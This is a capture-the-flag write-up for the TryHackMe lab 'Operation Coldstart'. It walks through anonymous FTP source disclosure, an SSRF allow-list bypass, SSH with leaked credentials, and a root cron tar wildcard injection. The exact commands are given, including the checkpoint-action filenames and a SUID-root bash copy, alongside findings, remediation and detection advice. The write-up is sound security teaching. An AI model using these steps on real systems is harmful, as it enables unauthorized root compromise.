---
title: "TryHackMe: Operation Coldstart"
date: 2026-06-14 23:55:00 +0200
categories: [TryHackMe]
tags:
  - linux
  - ftp
  - source-code-review
  - ssrf
  - ssh
  - credential-exposure
  - cron
  - tar
  - wildcard-injection
  - privilege-escalation
description: >-
  Operation Coldstart chains anonymous FTP source disclosure, a hostname-only
  SSRF allow-list bypass, plaintext SSH credentials, and a root cron tar
  wildcard injection into complete host compromise.
author: lenovolegion7
media_subpath: /images/tryhackme_operation_coldstart
image:
  path: room_image.webp
  alt: "Original TryHackMe Operation Coldstart room artwork"
toc: true
comments: false
---

Operation Coldstart is a Linux staging-server challenge built around source disclosure, SSRF, credential exposure, and unsafe privileged automation. The validated path started with anonymous FTP access to an application backup, reached localhost-only administrative notes through the URL preview service, obtained SSH access as `webdev`, and ended with root command execution through a cron-driven GNU tar wildcard injection.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Operation Coldstart room card](room_card.webp){: w="305" h="270" .shadow }](https://tryhackme.com/room/operationcoldstart){: .center }

## Executive Summary

The target exposed FTP, SSH, and a Gunicorn-hosted URL preview application:

```text
21/tcp  FTP
22/tcp  SSH
80/tcp  HTTP
```

The validated compromise path was:

1. authenticate to FTP anonymously;
2. retrieve `backup.tar.gz` from the public FTP area;
3. extract the Flask application source and review `/preview` and `/admin/` logic;
4. identify a hostname-only SSRF allow-list for `kestrel.thm`;
5. use the preview feature to reach the localhost-only `/admin/notes` route;
6. recover valid SSH credentials for `webdev`;
7. obtain an SSH shell and retrieve the user objective;
8. identify a root-owned cron job running GNU tar over `/opt/backups`;
9. abuse attacker-controlled filenames beginning with `--` as tar options;
10. trigger a checkpoint action from the root cron job;
11. create a SUID-root shell and obtain root-equivalent execution;
12. retrieve the final root objective.

> **Result:** Unauthenticated network access was converted into full root compromise through exposed source code, SSRF, plaintext credential disclosure, and unsafe root automation.
{: .prompt-danger }

## Scope and Safety Context

This assessment was performed only against the authorized TryHackMe laboratory target.

Testing was limited to the assigned host and did not include denial-of-service activity. The public writeup redacts target addresses, plaintext credentials, and challenge flags.

## Initial Enumeration

Service discovery identified three exposed services:

```console
$ nmap \
  -p21,22,80 \
  -sV -sC -T4 -Pn \
  TARGET_IP
```

Observed services:

```text
21/tcp  FTP   vsftpd 3.0.5
22/tcp  SSH   OpenSSH 9.6p1 Ubuntu
80/tcp  HTTP  Gunicorn - URL Preview / Volt Labs
```

Anonymous FTP login was enabled.

## Anonymous FTP Source Disclosure

The FTP `pub/` directory exposed an application backup:

```text
backup.tar.gz
```

Representative retrieval flow:

```console
$ ftp TARGET_IP

Name: anonymous

ftp> cd pub
ftp> mget backup.tar.gz
```

The archive contained:

```text
voltlabs-preview/app.py
voltlabs-preview/README.md
voltlabs-preview/requirements.txt
```

This disclosed the application logic needed to understand the preview endpoint and internal admin routing.

## Source Code Review and SSRF

The application allowed outbound requests only when the parsed hostname matched:

```text
kestrel.thm
```

The relevant design was equivalent to:

```python
host = (urlparse(target).hostname or "").lower()

if host not in ALLOWED_HOSTS:
    abort(403)

requests.get(target, timeout=3)
```

The admin route was separately restricted by source address:

```python
if not request.remote_addr.startswith("LOOPBACK_PREFIX"):
    abort(403)
```

Application comments showed that `kestrel.thm` resolved locally to the loopback interface. A request through `/preview` could therefore satisfy the hostname allow-list while reaching a localhost-only route from the server itself.

## SSRF to Internal Admin Notes

The validated SSRF request was:

```console
$ curl -sG \
  --data-urlencode \
  'url=http://kestrel.thm/admin/notes' \
  http://TARGET_IP/preview
```

The internal notes disclosed active SSH credentials for:

```text
webdev
```

The password is intentionally redacted:

```text
webdev : [REDACTED]
```

This converted an externally reachable preview function into a credential-disclosure path for a localhost-only administrative resource.

## SSH Foothold as webdev

The recovered credential authenticated successfully over SSH:

```console
$ ssh webdev@TARGET_IP
```

The resulting identity was:

```text
webdev
```

The user-level objective was located at:

```text
/home/webdev/user.txt
```

Its value is published only as:

```text
THM{[REDACTED]}
```

## Root Cron Tar Wildcard Injection

Local enumeration showed that `webdev` had no sudo rights, but could write to:

```text
/opt/backups
```

A root-owned cron entry executed every minute:

```text
cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

Because shell wildcard expansion occurs before `tar` receives its arguments, attacker-controlled filenames beginning with `--` were interpreted as GNU tar options.

GNU tar supports checkpoint actions, allowing a command to be executed by the root cron process.

Representative lab setup:

```console
$ cd /opt/backups

$ cat > rootme.sh <<'EOF2'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF2

$ chmod +x rootme.sh

$ touch -- '--checkpoint=1'
$ touch -- '--checkpoint-action=exec=sh rootme.sh'
```

After the next cron execution, the resulting binary was owned by root with the SUID bit set:

```text
/tmp/rootbash
```

Running it with preserved privileges:

```console
$ /tmp/rootbash -p
```

produced root-equivalent execution:

```text
euid=0(root)
```

The final objective was located at:

```text
/root/flag.txt
```

and is redacted:

```text
THM{[REDACTED]}
```

## Findings

### F-01 - Anonymous FTP Exposed Application Backup

- **Severity:** High
- **Affected service:** FTP / `pub/backup.tar.gz`
- **Impact:** unauthenticated application source disclosure

Anonymous FTP access exposed the application backup and source logic.

**Remediation:**

- disable anonymous FTP unless explicitly required;
- remove source archives and deployment artifacts from public transfer locations;
- replace FTP with authenticated encrypted transfer where needed;
- add deployment checks that prevent backup archives from reaching public paths.

### F-02 - Server-Side Request Forgery Through Hostname-Only Allow-List

- **Severity:** Critical
- **Affected endpoint:** `/preview`
- **Impact:** access to localhost-only administrative routes

The preview feature trusted only the parsed hostname. It did not safely validate the resolved destination IP, redirect behavior, or internal address space.

**Remediation:**

- validate scheme, host, port, path, redirects, and resolved destination IP;
- block loopback, private, link-local, multicast, and metadata ranges after DNS resolution;
- pin and revalidate DNS results;
- use strict egress filtering;
- require real authentication for internal admin routes instead of source-IP checks alone.

### F-03 - Plaintext SSH Credentials Stored in Admin Notes

- **Severity:** Critical
- **Affected account:** `webdev`
- **Impact:** direct remote shell access

The localhost-only administrative notes stored active SSH credentials in plaintext.

**Remediation:**

- remove credentials from notes, source, tickets, and documentation;
- rotate the exposed credential and audit for reuse;
- use SSH keys, short-lived credentials, or a secrets manager;
- monitor SSH authentication events.

### F-04 - Root Cron Tar Wildcard Injection in Writable Directory

- **Severity:** Critical
- **Affected path:** `/opt/backups`
- **Impact:** root command execution

A root cron job ran tar over a user-writable directory using an unqualified `*` wildcard. Attacker-controlled filenames became privileged tar options.

**Remediation:**

- never run privileged backup jobs directly over user-writable paths;
- avoid bare wildcards with privileged utilities;
- use explicit file lists and `--` where appropriate;
- move backup staging to root-owned directories;
- run backup automation with the lowest possible privilege;
- alert on files beginning with `--` in sensitive directories.

### F-05 - Forgotten Staging Host Exposed Externally

- **Severity:** High
- **Affected asset:** URL Preview staging service
- **Impact:** externally reachable internal tooling with weaker controls

The application identified itself as a staging URL preview service and warned that it should not be exposed externally.

**Remediation:**

- remove stale staging systems or place them behind VPN, SSO, and IP allow-lists;
- maintain asset ownership and inventory;
- apply production-grade hardening to all network-reachable staging systems;
- continuously scan for exposed internal services.

## Security Impact

The validated chain provided complete root-level control of the host.

An attacker with equivalent access could:

- obtain application source without authentication;
- bypass localhost-only administrative controls through SSRF;
- recover reusable SSH credentials;
- obtain an interactive shell as `webdev`;
- manipulate files consumed by privileged backup automation;
- execute commands with root privileges;
- access all data and controls available to root.

The compromise was enabled by weak operational separation between staging services, internal administrative tooling, secrets storage, and privileged automation.

## Detection Opportunities

Useful monitoring controls include:

- alert on anonymous FTP access and downloads of source archives;
- monitor requests to `/preview` targeting unusual hostnames or internal routes;
- detect application-originated requests to loopback/private destinations;
- alert on reads of internal notes containing credential-like material;
- monitor SSH authentication for staging accounts;
- alert on file creation in `/opt/backups` with names beginning with `--`;
- monitor modifications to root cron entries and backup scripts;
- detect creation of unexpected SUID binaries in `/tmp`;
- alert on execution of `/tmp/rootbash` or similar temporary privileged shells.

## Remediation Priorities

1. Disable anonymous FTP and remove exposed backup archives.
2. Rotate the `webdev` credential and audit for reuse.
3. Remove plaintext credentials from administrative notes.
4. Restrict or decommission the externally reachable staging preview service.
5. Implement robust SSRF destination validation and egress filtering.
6. Replace source-IP-only admin controls with real authentication.
7. Rewrite the root tar cron job to avoid user-controlled wildcard expansion.
8. Move backup staging to a root-owned directory.
9. Monitor sensitive directories for option-like filenames.
10. Introduce secrets management and credential scanning.
11. Maintain a staging-system inventory and ownership lifecycle.

## Retest Plan

1. Confirm anonymous FTP cannot retrieve application backups.
2. Verify `/preview` cannot reach loopback, private, link-local, or metadata destinations.
3. Confirm redirects are revalidated against SSRF policy.
4. Verify `/admin/notes` requires real authentication.
5. Confirm the old `webdev` password no longer authenticates.
6. Verify credentials are absent from notes and source archives.
7. Confirm `webdev` cannot influence files consumed by root backup automation.
8. Verify option-like filenames in backup directories cannot alter tar behavior.
9. Confirm the previous checkpoint-action technique no longer executes as root.
10. Verify no unexpected SUID binaries are created during backup processing.
11. Confirm the previous chain no longer reaches root.

## Lessons Learned

Operation Coldstart demonstrates how a forgotten staging system can become a complete compromise path when several ordinary weaknesses align.

Anonymous FTP disclosed exact application logic. A hostname-only SSRF policy trusted a name that resolved to localhost. Local admin notes stored an active SSH credential, and a root cron job converted user-controlled filenames into privileged tar options.

The strongest defensive response is to treat staging exposure, source-code hygiene, SSRF controls, secret storage, and backup automation as one connected security boundary.
